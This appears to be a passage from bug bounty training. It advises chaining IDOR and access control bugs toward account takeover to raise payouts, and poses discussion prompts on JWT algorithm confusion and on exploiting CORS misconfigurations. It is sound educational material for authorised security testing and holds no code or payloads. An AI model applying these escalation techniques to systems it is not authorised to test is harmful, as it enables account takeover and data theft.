Before submitting a single IDOR or access control bug, spend 30 minutes exploring what you can chain. Can you escalate from data read to data write? From data write to account takeover? From one user's data to all users' data via enumeration? The chain determines the severity, and the severity determines the payout. A well-demonstrated chain with full ATO impact will pay 5–10x more than the individual components submitted separately.
💬 Discussion Prompts
  • 01 You discover an IDOR that exposes non-sensitive data (display names and profile pictures) for all users. The program rates this as informational. How would you investigate whether this IDOR can be chained with other endpoints to escalate impact, and at what point does the chain justify a re-submission at higher severity?
  • 02 An application uses JWTs with RS256 but the public key is not exposed at any well-known endpoint. What techniques would you use to obtain or derive the public key, and how does this affect your ability to test for algorithm confusion attacks?
  • 03 You find a CORS misconfiguration that reflects arbitrary origins with credentials on an API endpoint. However, the endpoint only returns the authenticated user's own username and email. How do you frame the impact in your report to ensure it is not dismissed as low-severity, and what additional reconnaissance would you perform to find higher-impact endpoints with the same misconfiguration?
